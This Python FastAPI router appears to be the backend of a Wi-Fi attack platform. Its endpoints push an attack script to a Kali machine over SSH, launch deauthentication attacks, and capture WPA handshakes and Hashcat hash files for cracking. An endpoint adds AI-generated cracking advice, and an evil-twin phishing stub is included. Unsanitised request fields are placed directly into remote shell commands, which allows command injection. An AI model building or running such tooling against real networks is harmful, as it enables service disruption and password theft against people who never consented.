from fastapi import APIRouter, HTTPException
from fastapi.responses import FileResponse
from pydantic import BaseModel
from app.modules.ai_agent.service import ai_service
from app.core.ssh_manager import ssh_client
import os
import time
import json
from pathlib import Path

router = APIRouter()


# === 请求模型 ===
class AttackRequest(BaseModel):
    bssid: str
    interface: str = "wlan0"
    channel: str = "1"
    duration: int = 60


class AIAnalysisRequest(BaseModel):
    ssid: str
    encryption: str
    bssid: str


# === 🛡️ 智能脚本定位 ===
def find_payload_script(script_name: str):
    current_file = Path(__file__).resolve()
    search_paths = [
        current_file.parents[5] / "kali_payloads" / script_name,
        current_file.parents[4] / "kali_payloads" / script_name,
        Path.cwd() / "kali_payloads" / script_name,
        Path.cwd().parent / "kali_payloads" / script_name,
    ]
    for p in search_paths:
        if p.exists(): return str(p)
    return None


# =======================
# 1. 文件下载接口 (新增)
# =======================
@router.get("/download/{filename}")
async def download_file(filename: str):
    """下载 captures 目录下的文件"""
    # 安全检查: 防止目录遍历
    if ".." in filename or "/" in filename:
        raise HTTPException(400, "Invalid filename")

    file_path = Path.cwd() / "captures" / filename
    if not file_path.exists():
        raise HTTPException(404, "File not found")

    return FileResponse(path=file_path, filename=filename, media_type='application/octet-stream')


# =======================
# 2. Deauth 攻击接口
# =======================
@router.post("/deauth")
async def start_deauth_attack(req: AttackRequest):
    if not ssh_client.client:
        try:
            ssh_client.connect()
        except Exception as e:
            raise HTTPException(500, f"SSH连接失败: {str(e)}")

    script_name = "attack_worker.py"
    local_path = find_payload_script(script_name)
    if not local_path: raise HTTPException(500, f"缺失 {script_name}")

    try:
        remote_path = ssh_client.upload_payload(local_path, script_name)
        duration = int(req.duration)
        cmd = f"nohup python3 {remote_path} deauth --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {duration} > /tmp/attack_deauth.log 2>&1 &"
        ssh_client.exec_command(cmd)
        return {"status": "started", "msg": "Deauth 攻击已启动", "log": "/tmp/attack_deauth.log"}
    except Exception as e:
        raise HTTPException(500, f"执行异常: {str(e)}")


# =======================
# 3. 握手包捕获接口 (升级版)
# =======================
@router.post("/handshake")
async def start_handshake_capture(req: AttackRequest):
    print(f"[*] 收到握手包捕获请求: {req.bssid}")
    if not ssh_client.client: ssh_client.connect()

    script_name = "attack_worker.py"
    local_path = find_payload_script(script_name)
    remote_path = ssh_client.upload_payload(local_path, script_name)

    # 同步执行
    cmd = f"python3 {remote_path} handshake --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {req.duration}"
    print(f"[*] Executing: {cmd}")

    try:
        # 等待脚本执行完毕
        stdin, stdout, stderr = ssh_client.exec_command(cmd)
        output = stdout.read().decode()
        print(f"[DEBUG] Kali Output:\n{output}")

        response_data = {"status": "failed", "msg": "未捕获到握手包", "debug": output}
        local_dir = Path.cwd() / "captures"
        if not local_dir.exists(): local_dir.mkdir()

        # 1. 处理 .cap 文件
        if "CAPTURED_HS_POTENTIAL" in output:
            cap_files = [f"/tmp/handshake_{req.bssid.replace(':', '')}-01.cap",
                         f"/tmp/handshake_{req.bssid.replace(':', '')}-01.pcap"]
            remote_cap = None
            for f in cap_files:
                _in, _out, _err = ssh_client.exec_command(f"ls {f}")
                if not _err.read():
                    remote_cap = f
                    break

            if remote_cap:
                ts = int(time.time())
                local_cap = f"handshake_{req.bssid.replace(':', '')}_{ts}.cap"
                if ssh_client.download_file(remote_cap, str(local_dir / local_cap)):
                    response_data["status"] = "success"
                    response_data["msg"] = "成功捕获握手包"
                    response_data["cap_file"] = local_cap

            # 2. 处理 .hc22000 文件 (Hashcat)
            if "Hash file generated" in output:
                remote_hash = f"/tmp/handshake_{req.bssid.replace(':', '')}.hc22000"
                local_hash = f"handshake_{req.bssid.replace(':', '')}_{ts}.hc22000"

                # 检查远程文件是否存在
                _in, _out, _err = ssh_client.exec_command(f"ls {remote_hash}")
                if not _err.read():
                    if ssh_client.download_file(remote_hash, str(local_dir / local_hash)):
                        response_data["hash_file"] = local_hash

        return response_data

    except Exception as e:
        return {"status": "error", "msg": str(e)}


# =======================
# 4. AI 分析 & Mock
# =======================
@router.post("/ai/analyze_target")
async def analyze_target(req: AIAnalysisRequest):
    try:
        raw = ai_service.analyze_wifi_target(req.ssid, req.encryption, "Unknown")
        if isinstance(raw, dict) and "risk_level" in raw: return raw
        return {
            "risk_level": "中 (Medium)",
            "summary": "AI 服务暂未返回标准数据。",
            "advice": "目标使用 WPA/WPA2 加密。建议尝试捕获握手包。",
            "dict_rules": ["纯数字", "手机号段"]
        }
    except Exception as e:
        return {"risk_level": "Unknown", "summary": "Error", "advice": str(e), "dict_rules": []}


@router.post("/eviltwin/start")
async def start_evil_twin(req: dict):
    return {"status": "started", "msg": "钓鱼功能演示模式已启动"}